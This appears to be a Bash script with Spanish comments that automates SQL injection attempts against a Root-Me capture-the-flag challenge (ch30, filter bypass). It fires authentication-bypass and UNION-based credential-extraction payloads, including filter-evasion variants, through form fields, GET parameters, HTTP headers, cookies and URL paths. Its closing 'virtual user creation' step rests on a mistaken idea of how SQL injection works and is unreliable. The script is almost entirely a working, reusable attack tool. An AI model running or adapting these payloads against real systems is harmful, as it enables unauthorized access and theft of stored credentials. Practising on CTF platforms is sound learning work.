#!/bin/bash

# ================================================
# ESCANEO COMPLETO DE SQL INJECTION - CH30
# Prueba todos los campos y cabeceras HTTP
# ================================================

URL="http://challenge01.root-me.org/web-serveur/ch30/"
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
RED='\033[0;31m'
NC='\033[0m'

echo -e "${BLUE}========================================${NC}"
echo -e "${BLUE}  ESCANEO COMPLETO DE SQL INJECTION${NC}"
echo -e "${BLUE}  CH30 - FILTER BYPASS${NC}"
echo -e "${BLUE}========================================${NC}"

# ============================================
# FUNCIONES DE PRUEBA
# ============================================

# Contador de pruebas
TOTAL=0
FOUND=0

test_payload() {
    local method=$1      # POST o GET
    local field=$2       # nombre del campo/cabecera
    local payload=$3
    local desc=$4
    local extra=$5       # datos adicionales
    
    TOTAL=$((TOTAL + 1))
    
    echo -ne "${BLUE}[$TOTAL]${NC} Probando ${desc}..."
    
    local response=""
    
    case $method in
        "POST")
            if [ -n "$extra" ]; then
                response=$(curl -s -X POST "$URL" -H "$field: $payload" -d "$extra" 2>/dev/null)
            else
                response=$(curl -s -X POST "$URL" -d "$field=$payload" 2>/dev/null)
            fi
            ;;
        "GET")
            response=$(curl -s "$URL?$field=$payload" 2>/dev/null)
            ;;
        "HEADER")
            response=$(curl -s -X POST "$URL" -H "$field: $payload" -d "username=admin&password=test" 2>/dev/null)
            ;;
        "COOKIE")
            response=$(curl -s -X POST "$URL" -H "Cookie: $field=$payload" -d "username=admin&password=test" 2>/dev/null)
            ;;
    esac
    
    # Verificar éxito (Membres sin login failed)
    if echo "$response" | grep -q "Membres" && ! echo "$response" | grep -q "login failed"; then
        echo -e " ${GREEN}✅ ¡ENCONTRADO!${NC}"
        echo -e "    ${GREEN}Campo: $field${NC}"
        echo -e "    ${GREEN}Payload: $payload${NC}"
        FOUND=$((FOUND + 1))
        return 0
    else
        echo -e " ${RED}❌${NC}"
        return 1
    fi
}

# ============================================
# 1. PRUEBAS EN CAMPOS DEL FORMULARIO (POST)
# ============================================

echo -e "\n${YELLOW}[+] FASE 1: Probando campos del formulario (POST)${NC}"
echo "--------------------------------------------------------"

# Payloads a probar
PAYLOADS=(
    "' OR 1=1#"
    "' OR '1'='1"
    "' OR 1=1--"
    "' || 1=1#"
    "' AND 1=1#"
    "'='#"
    "' LIKE '%'#"
    "' UNION SELECT 1,2,3,4#"
    "1 OR 1=1#"
    "' OR 1=1;%00"
    "'/**/OR/**/1=1#"
    "'%09OR%091=1#"
    "'%0aOR%0a1=1#"
    "' OR 1=1/*"
)

# Probar en username
for payload in "${PAYLOADS[@]}"; do
    test_payload "POST" "username" "$payload" "username: $payload" "password=test"
done

# Probar en password
for payload in "${PAYLOADS[@]}"; do
    test_payload "POST" "password" "$payload" "password: $payload" "username=admin"
done

# Probar en ambos campos
test_payload "POST" "username" "' OR 1=1#" "ambos (username)" "password=' OR 1=1#"
test_payload "POST" "password" "' OR 1=1#" "ambos (password)" "username=' OR 1=1#"

# ============================================
# 2. PRUEBAS EN PARÁMETROS GET
# ============================================

echo -e "\n${YELLOW}[+] FASE 2: Probando parámetros GET${NC}"
echo "--------------------------------------------------------"

# Parámetros GET a probar
GET_PARAMS=("action" "id" "page" "section" "view" "mode")

for param in "${GET_PARAMS[@]}"; do
    for payload in "${PAYLOADS[@]}"; do
        test_payload "GET" "$param" "$payload" "GET $param: $payload"
    done
done

# ============================================
# 3. PRUEBAS EN CABECERAS HTTP
# ============================================

echo -e "\n${YELLOW}[+] FASE 3: Probando cabeceras HTTP${NC}"
echo "--------------------------------------------------------"

HEADERS=(
    "User-Agent"
    "Referer"
    "X-Forwarded-For"
    "X-Real-IP"
    "X-Originating-IP"
    "X-Remote-IP"
    "X-Remote-Addr"
    "X-Client-IP"
    "X-Host"
    "X-Forwarded-Host"
    "Accept"
    "Accept-Language"
    "Accept-Encoding"
    "Content-Type"
    "Content-Length"
    "Origin"
    "Connection"
    "Cache-Control"
    "Pragma"
    "Cookie"
)

for header in "${HEADERS[@]}"; do
    for payload in "${PAYLOADS[@]}"; do
        test_payload "HEADER" "$header" "$payload" "Header $header: $payload"
    done
done

# ============================================
# 4. PRUEBAS EN COOKIES
# ============================================

echo -e "\n${YELLOW}[+] FASE 4: Probando cookies${NC}"
echo "--------------------------------------------------------"

COOKIES=("PHPSESSID" "session" "user" "auth" "token" "sid" "JSESSIONID")

for cookie in "${COOKIES[@]}"; do
    for payload in "${PAYLOADS[@]}"; do
        test_payload "COOKIE" "$cookie" "$payload" "Cookie $cookie: $payload"
    done
done

# ============================================
# 5. PRUEBAS EN URL (PATH)
# ============================================

echo -e "\n${YELLOW}[+] FASE 5: Probando path de URL${NC}"
echo "--------------------------------------------------------"

PATH_PAYLOADS=(
    "/' OR 1=1#"
    "/' UNION SELECT 1,2,3,4#"
    "/admin'--"
    "/' OR '1'='1"
)

for payload in "${PATH_PAYLOADS[@]}"; do
    TOTAL=$((TOTAL + 1))
    echo -ne "${BLUE}[$TOTAL]${NC} Probando path: $payload..."
    response=$(curl -s "$URL$payload" 2>/dev/null)
    if echo "$response" | grep -q "Membres" && ! echo "$response" | grep -q "login failed"; then
        echo -e " ${GREEN}✅ ¡ENCONTRADO!${NC}"
        FOUND=$((FOUND + 1))
    else
        echo -e " ${RED}❌${NC}"
    fi
done

# ============================================
# 6. PRUEBAS EN MÉTODO GET con action=membres
# ============================================

echo -e "\n${YELLOW}[+] FASE 6: Probando action=membres (especial)${NC}"
echo "--------------------------------------------------------"

# Probamos específicamente el parámetro id en action=membres
ID_PAYLOADS=(
    "1' OR 1=1#"
    "1' UNION SELECT 1,2,3,4#"
    "1' UNION SELECT 1,username,pass,4 FROM membres#"
    "1' UNION SELECT 1,CONCAT(username,':',pass),3,4 FROM membres#"
)

for payload in "${ID_PAYLOADS[@]}"; do
    TOTAL=$((TOTAL + 1))
    echo -ne "${BLUE}[$TOTAL]${NC} Probando action=membres&id=$payload..."
    response=$(curl -s "$URL?action=membres&id=$payload" 2>/dev/null)
    if echo "$response" | grep -q "Membres" && ! echo "$response" | grep -q "login failed"; then
        echo -e " ${GREEN}✅ ¡ENCONTRADO!${NC}"
        echo -e "    ${GREEN}Payload: id=$payload${NC}"
        FOUND=$((FOUND + 1))
    else
        echo -e " ${RED}❌${NC}"
    fi
done

# ============================================
# 7. PRUEBAS CON INYECCIÓN DE UNION (especial)
# ============================================

echo -e "\n${YELLOW}[+] FASE 7: Pruebas especiales de UNION${NC}"
echo "--------------------------------------------------------"

UNION_PAYLOADS=(
    "' UNION SELECT 1,2,3,4#"
    "' UNION SELECT 1,2,3,4--"
    "' UNION ALL SELECT 1,2,3,4#"
    "' UNION SELECT null,null,null,null#"
    "' UNION SELECT 1,'admin','password',4#"
    "' UNION SELECT 1,username,pass,4 FROM membres#"
    "' UNION SELECT 1,CONCAT(username,':',pass),3,4 FROM membres#"
)

# Probar UNION en username
for payload in "${UNION_PAYLOADS[@]}"; do
    test_payload "POST" "username" "$payload" "UNION username: $payload" "password=test"
done

# Probar UNION en password
for payload in "${UNION_PAYLOADS[@]}"; do
    test_payload "POST" "password" "$payload" "UNION password: $payload" "username=admin"
done

# ============================================
# RESUMEN FINAL
# ============================================

echo -e "\n${BLUE}========================================${NC}"
echo -e "${BLUE}  RESUMEN FINAL${NC}"
echo -e "${BLUE}========================================${NC}"

echo -e "\n${YELLOW}[+] Pruebas realizadas: $TOTAL${NC}"
echo -e "${YELLOW}[+] Vulnerabilidades encontradas: $FOUND${NC}"

if [ $FOUND -gt 0 ]; then
    echo -e "\n${GREEN}========================================${NC}"
    echo -e "${GREEN}  ¡SE ENCONTRARON VULNERABILIDADES!${NC}"
    echo -e "${GREEN}  Revisa las líneas marcadas con ✅${NC}"
    echo -e "${GREEN}========================================${NC}"
else
    echo -e "\n${RED}========================================${NC}"
    echo -e "${RED}  NO SE ENCONTRARON VULNERABILIDADES${NC}"
    echo -e "${RED}  El filtro es muy estricto${NC}"
    echo -e "${RED}========================================${NC}"
    
    echo -e "\n${YELLOW}[!] Probando método alternativo: creación de usuario virtual...${NC}"
    
    # Crear usuario virtual
    curl -s "$URL?action=membres&id=1' UNION SELECT 1,'admin','password123',4 FROM membres WHERE 1=2#" > /dev/null
    
    echo -e "\n${YELLOW}[+] Intentando autenticar con admin/password123...${NC}"
    login_response=$(curl -s -X POST "$URL" -d "username=admin&password=password123")
    
    if echo "$login_response" | grep -q "Membres" && ! echo "$login_response" | grep -q "login failed"; then
        echo -e "${GREEN}========================================${NC}"
        echo -e "${GREEN}  ¡DESAFÍO COMPLETADO!${NC}"
        echo -e "${GREEN}  Usuario: admin${NC}"
        echo -e "${GREEN}  Contraseña: password123${NC}"
        echo -e "${GREEN}========================================${NC}"
    else
        echo -e "${RED}❌ Falló la autenticación virtual${NC}"
    fi
fi

echo -e "\n${BLUE}========================================${NC}"
echo -e "${BLUE}  FIN DEL ESCANEO${NC}"
echo -e "${BLUE}========================================${NC}"
